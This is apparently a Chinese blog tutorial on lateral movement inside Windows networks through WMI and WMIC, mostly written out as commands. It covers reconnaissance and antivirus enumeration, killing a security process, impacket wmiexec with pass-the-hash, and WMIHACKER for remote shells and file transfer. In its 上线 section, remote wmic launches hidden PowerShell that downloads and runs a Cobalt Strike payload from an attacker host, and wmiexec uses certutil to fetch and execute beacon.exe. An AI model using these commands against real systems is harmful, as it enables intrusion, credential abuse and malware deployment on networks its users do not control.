# 原创
：  【内网安全-横向移动】WMI-WMIC命令&相关内网工具

# 【内网安全-横向移动】WMI-WMIC命令&amp;相关内网工具

**目录**

[一、WMI](#%E4%B8%80%E3%80%81WMI)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[ 1）官方介绍：](#%C2%A01%EF%BC%89%E5%AE%98%E6%96%B9%E4%BB%8B%E7%BB%8D%EF%BC%9A)

[2）优点：](#2%EF%BC%89%E4%BC%98%E7%82%B9%EF%BC%9A)

[3）条件：](#3%EF%BC%89%E6%9D%A1%E4%BB%B6%EF%BC%9A)

[4）不足：](#4%EF%BC%89%E4%B8%8D%E8%B6%B3%EF%BC%9A)

[5）WMIC管理命令：](#5%EF%BC%89WMIC%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4%EF%BC%9A)

[6）相关工具：](#6%EF%BC%89%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%EF%BC%9A)

[ 2、上线：](#%C2%A02%E3%80%81%E4%B8%8A%E7%BA%BF%EF%BC%9A)

[1、wmic](#1%E3%80%81wmic)

[2、impacket-wmiexec](#2%E3%80%81impacket-wmiexec)

[3、wmicmd.exe](#3%E3%80%81wmicmd.exe)

[4、WMIHACKER](#4%E3%80%81WMIHACKER)

---


## 一、WMI

> 
<h3>1、简述：</h3>
<h4> 1）官方介绍：</h4>
WMI 具有管理员和 WMI 提供程序编写器使用的多个命令行工具
[WMI 命令行工具 - Win32 apps | Microsoft Learn<img alt="icon-default.png?t=N176" src="https://csdnimg.cn/release/blog_editor_html/release2.2.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N176"/>https://learn.microsoft.com/zh-cn/windows/win32/wmisdk/wmi-command-line-tools](https://learn.microsoft.com/zh-cn/windows/win32/wmisdk/wmi-command-line-tools)
<hr/>
<h4>2）优点：</h4>
内网中大多数 Win系统自带 wmic 命令，并且该方法不会在目标日志系统留下痕迹，支持用户名明文或者hash的方式进行认证
<hr/>
<h4>3）条件：</h4>
目标主机开放 135 端口（建立连接）；且允许随机一个高位端口进行数据通信；需要本地管理员或域管理员权限；部分命令可能不可用（如查询杀软）；防火墙开放连接、通信端口
<hr/>
<h4>4）不足：</h4>
系统自带的 WMIC ，连接执行命令无回显---&gt;将执行的返回结果写入文件---&gt;读取文件内容
<hr/>
<h4>5）WMIC管理命令：</h4>
（命令来自网络）
<pre><code>1、常用命令：
wmic logon list brief            #登录⽤户
wmic ntdomain list brief         #域控机器
wmic useraccount list brief      #⽤户列表
wmic share get name,path         #查看系统共享
wmic service list brief |more    #服务列表
wmic startup list full           #识别开机启动的程序，包括路径
wmic fsdir "c:\\test" call delete             #删除C盘下的test目录
wmic nteventlog get path,filename,writeable   #查看系统中开启的⽇志
wmic nicconfig get ipaddress,macaddress       #查看系统中⽹卡的IP地址和MAC地址
wmic qfe get description,installedOn          #使⽤wmic识别安装到系统中的补丁情况
wmic product get name,version                 #查看系统中安装的软件及版本
wmic useraccount where "name='%UserName%'" call rename newUserName   #更改当前用户名
wmic useraccount where "name='Administrator'" call Rename admin      #更改指定用户名
wmic bios list full | findstr /i "vmware"     #查看当前系统是否是VMWARE（按实际情况进行筛选）
wmic desktop get screensaversecure,screensavertimeout       #查看当前系统是否有屏保，及延迟
wmic process where name="vmtoolsd.exe" get executablepath   #获取指定进程可执行文件的路径
wmic environment where "name='temp'" get UserName,VariableValue      #获取temp环境变量

2、查询当前主机的杀毒软件（可能无法正常使用）
wmic process where "name like '%forti%'" get name
wmic process where name="FortiTray.exe" call terminate
wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe
wmic /namespace:\\root\securitycenter2 path antispywareproduct GET displayName,productState, pathToSignedProductExe &amp; wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe
wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List

3、查询windows机器版本和服务位数和.net版本
wmic os get caption
wmic os get osarchitecture
wmic OS get Caption,CSDVersion,OSArchitecture,Version
wmic product where "Name like 'Microsoft .Net%'" get Name, Version


4、查询本机所有盘符
wmic logicaldisk list brief
wmic logicaldisk get description,name,size,freespace /value

5、卸载和重新安装程序
wmic product where "name like '%Office%'" get name
wmic product where name="Office" call uninstall

6、查看某个进程的详细信息 （路径，命令⾏参数等）
wmic process where name="chrome.exe" list full
wmic process where name="frp.exe" get executablepath,name,ProcessId   进程路径
wmic process where caption="frp.exe" get caption,commandline /value

7、更改PATH环境变量值，新增c:\whoami
wmic environment where "name='path' and username='&lt;system&gt;'" set VariableValue="%path%;c:\whoami

8、查看某个进程的详细信息-PID
wmic process list brief
tasklist /SVC | findstr frp.exe
wmic process where ProcessId=3604 get ParentProcessId,commandline,processid,executablepath,name,CreationClassName,CreationDate

9、终⽌⼀个进程
wmic process where name ="xshell.exe" call terminate
ntsd -c q -p 进程的PID
taskkill -im pid

10、获取电脑产品编号和型号信息
wmic baseboard get Product,SerialNumber
wmic bios get serialnumber

11、安装软件
wmic product get name,version
wmic product list brief

12、使用Powershell操作wmi
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Share    #共享
Get-WmiObject -Namespace ROOT\CIMV2 -Class CIM_DataFile   #⽂件/⽬录列表
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Volume   #磁盘卷列表
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Process  #当前进程
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Service  #列举服务
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_NtLogEvent           #⽇志
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_LoggedOnUser         #登陆账户
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_QuickFixEngineering  #补丁
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct #杀毒软件

13、操作系统相关信息
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_BIOS

14、注册表操作
Get-WmiObject -Namespace ROOT\DEFAULT -Class StdRegProv
Push-Location HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty OptionalComponents</code></pre>
<hr/>
<h4>6）相关工具：</h4>
wmiexec.py：
[impacket/wmiexec.py at master · fortra/impacket (github.com)<img alt="icon-default.png?t=N176" src="https://csdnimg.cn/release/blog_editor_html/release2.2.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N176"/>https://github.com/fortra/impacket/blob/master/examples/wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)
（impacket 工具包里）提供了通过 wmi 执行命令并回显的功能（445、135 和高位随机端口；445端口是SMB连接，完成执行命令的回显），未开放也支持无回显的方式进行命令执行
<pre><code>注：特殊字符用\转移，如@---&gt;\@
1、连接
python3 wmiexec.py  用户名:密码\@目标IP
python3 wmiexec.py  域名/用户名:密码\@目标IP

2、执行命令 
python3 wmiexec.py  域名/用户名:密码\@目标IP  "命令"

3、哈希传递获得shell
python3 wmiexec.py -hashes LM-Hash:NT-Hash 域名/用户名\@目标IP

4、获得shell后，执行命令
python3 wmiexec.py -hashes LM-Hash:NT-Hash 域名/用户名\@目标IP "命令"   </code></pre>
Windows操作系统中的密码一般由两部分组成，一部分为LM Hash，另一部分为NTLM Hash
即：username:RID:LM-HASH:NT-HASH
——————
wmicmd：
1、简述：一个仅使用WMI的小型实用程序：执行命令shell命令、从这些命令中捕获标准输出并写入注册表、读取然后从注册表中删除、打印到本地标准输出（需要.NET相应版本）
2、项目地址：
[nccgroup/WMIcmd: A command shell wrapper using only WMI for Microsoft Windows (github.com)<img alt="icon-default.png?t=N176" src="https://csdnimg.cn/release/blog_editor_html/release2.2.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N176"/>https://github.com/nccgroup/WMIcmd](https://github.com/nccgroup/WMIcmd)（使用方法项目地址里有）
——————
WMIHACKER：
1、简述：将执行结果写入到注册表（方法：使用事件触发器调用 VB 代码，达到命令执行效果）
2、区别：（都是写入注册表）wmiexe.py 和 wmicmd 是通过创建win32Process 进程执行命令<br/> 3、项目地址：
[rootclay/WMIHACKER: A Bypass Anti-virus Software Lateral Movement Command Execution Tool (github.com)<img alt="icon-default.png?t=N176" src="https://csdnimg.cn/release/blog_editor_html/release2.2.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N176"/>https://github.com/rootclay/WMIHACKER](https://github.com/rootclay/WMIHACKER)
——————
Ladon插件（集成）：
项目地址：
[Releases · k8gege/Ladon (github.com)<img alt="icon-default.png?t=N176" src="https://csdnimg.cn/release/blog_editor_html/release2.2.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N176"/>https://github.com/k8gege/Ladon/releases](https://github.com/k8gege/Ladon/releases)
功能如下：
<pre><code>1、网络资产收集
多协议探测存活主机
仅ICMP探测存活(快)
Oxid多网卡主机探测
多协议操作系统探测
网站、标题、Banner
智能网站CMS识别
常见端口服务探测
Shiro探测
Cisco探测
LDAP服务器探测
FTP服务器探测
枚举MSSQL服务器
枚举共享资源

2、系统信息探测
SMB探测系统信息
WMI探测系统信息
NBT探测系统信息
RDP探测系统信息
SNMP探测系统信息
MSSQL探测系统信息
WINRM探测系统信息
Exchange探测系统信息

3、远程漏洞检测
SMB永恒之蓝检测
SMB永恒之黑检测
Struts2漏洞检测
Weblogic漏洞检测
PhpStudy后门检测
ActiveMQ漏洞检测
Tomcat漏洞检测

4、一键GetShell
Exchange CVE-2020-0688
Weblogic GetShell
Tomcat GetShell

5、网络密码嗅探
FTP密码嗅探
HTTP密码嗅探

6、网络密码审计
445端口SMB密码审计(Windows)
135端口WMI密码审计(Windows)
445端口SMB-HASH密码审计(Windows)
135端口WMI-HASH密码审计(Windows)
139端口NBT密码审计(Windows)
5985端口Winrm密码审计(Windows)
21端口FTP密码审计(多平台)
5900端口VNC密码审计(多平台)
389端口LDAP密码审计(Windows)
1521端口Oracle数据库密码审计(多平台)
1433端口SQL数据库密码审计(Windows)
3306端口MYSQL数据库密码审计(多平台)
7001端口Weblogic后台密码审计(多平台)
Web端口Tomcat后台密码审计(多平台)
Web端口401基础认证密码审计(多平台)
22端口SSH密码审计(Linux_多平台)
网络摄像头密码审计(401认证)

7、本机执行
sc服务执行(system权限)
at计划任务(system权限)
Runas(模拟用户执行)
RunPS(无powershell执行)
ForExec(循环执行命令)

8、远程执行
WinrmExec
SshExec
SmbExec
PsExec
AtExec
WmiExec
WmiExec2
WinrmExec
JspShell
AspShell
AspxShell
PhpShell


9、本地提权
BypassUac
eventvwr
fodhelper
computerdefaults
sdclt
slui

BypassUac2
GetSystem
Runas
ms16135
BadPotato
SweetPotato
RDPHijack
CVE-2021-1675

10、自启动
注册表自启动
服务启动项

11、3389远程桌面
一键开启3389
查看3389远程连接
查看管理员组用户
激活Administrator
激活用户Guest
远程桌面会话劫持

12、远程下载
Http文件下载
FTP文件下载

13、域(DC、LDAP)
域内机器信息获取(域内)
389端口LDAP服务器探测
389端口LDAP密码审计
CVE-2020-1472域控提权

14、后门/木马查看
注册表启动项
系统却持DLL

15、域名解析
Domain2IP
Host2IP

16、端口转发
netsh(系统自带)
PortTran

17、本机信息收集
查看本机IP(内外网)
当前用户、特权信息
GUID、CPUID、DiskID
基础信息(仅cmd获取)
基础信息(含wmi获取)
获取命令行参数
获取进程详细信息
查看IE代理信息
查看本机命名管道
查看3389远程连接
查看USB使用记录
查看管理员组用户
查看最近访问文件
查看安装.NET版本
查看PowerShell版本
查看已安装程序版本

18、本机密码读取
IIS站点密码
CVE-2021-36934
DumpLsass

19、MSF/NC联动
Shell_bind_tcp
Shell_reverse_tcp
Met_reverse_http
Met_reverse_https
Shell_reverse_icmp
Shell_reverse_dns

20、其它功能
网站HTML源码查看</code></pre>



#### 2）优点：

---


#### 4）不足：

---


#### 6）相关工具：

> 
<h3> 2、上线：</h3>
<h4>1、wmic</h4>
1）方法一：
Attacks---&gt;Web Drive-by---&gt;Scripted Web Delivery(脚本式网页递送)

进行相关的配置（与后面上线cs命令，紧密贴合）
设置监听器、以及Type为powershell

在客户机上执行wmic命令
<pre>`wmic /NODE:192.168.*.*（目标主机） /user:"用户" /password:"密码" PROCESS call create "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://*.*.*.*:port/a'))\""`</pre>

上线cs成功

 ——————
2）方法二：
Attacks---&gt;Packages---&gt;payload generator（有效载荷发生器）
选中监听器---&gt;载荷选Powershell
客户机上执行wmic命令（指定机器上线CS）
<pre><code>wmic /NODE:192.168.*.* /user:"用户" /password:"密码" PROCESS call create "powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://*.*.*.*:port/payload.ps1');\""
</code></pre>

<hr/>
<h4>2、impacket-wmiexec</h4>
1）执行命令
交互式&amp;单执行<br/> wmiexec ./administrator:密码@192.168.*.*(目标主机) "whoami"<br/> wmiexec -hashes :值 ./administrator@192.168.*.*(目标主机) "whoami"
——————
2）下载后门
wmiexec ./administrator:密码@192.168.*.*(目标主机) "cmd.exe /c certutil -urlcache -split -f http://192.168.*.*/beacon.exe c:/beacon.exe"
——————
3）执行后门<br/> wmiexec ./administrator:密码@192.168.*.*(目标主机) "cmd.exe /c c:/beacon.exe"
<hr/>
<h4>3、wmicmd.exe</h4>
（需要.NET环境）
1）在工作组上使用
<pre>`WMIcmd.exe -h IP -d hostname -u localadmin -p theirpassword -c "command"`</pre>
2）在域内使用
<pre>`WMIcmd.exe -h IP -d domain -u domainadmin -p theirpassword -c "command"`</pre>
<hr/>
<h4>4、WMIHACKER</h4>
使用方法来自GitHub
[rootclay/WMIHACKER：绕过防病毒软件横向移动命令执行工具 (github.com)<img alt="icon-default.png?t=N176" src="https://csdnimg.cn/release/blog_editor_html/release2.2.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N176"/>https://github.com/rootclay/WMIHACKER](https://github.com/rootclay/WMIHACKER)
<pre><code>1、命令执行后显示结果
cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo" 1

2、命令执行后不显示任何结果
cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo &gt; c:\1.txt" 0

3、获取交互式shell
cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator "Password!"

4、文件上传：将本地calc.exe复制到远程主机c:\calc.exe
cscript wmihacker_0.6.vbs /upload 172.16.94.187 administrator "Password!" 
"c:\windows\system32\calc.exe" "c:\calc"

5、文件下载：将远程主机calc.exe下载到本地c:\calc.exe
cscript wmihacker_0.6.vbs /download 172.16.94.187 administrator "Password!" "c:\calc" "c:\windows\system32\calc.exe"</code></pre>



#### 2、impacket-wmiexec

---


#### 4、WMIHACKER

 

 
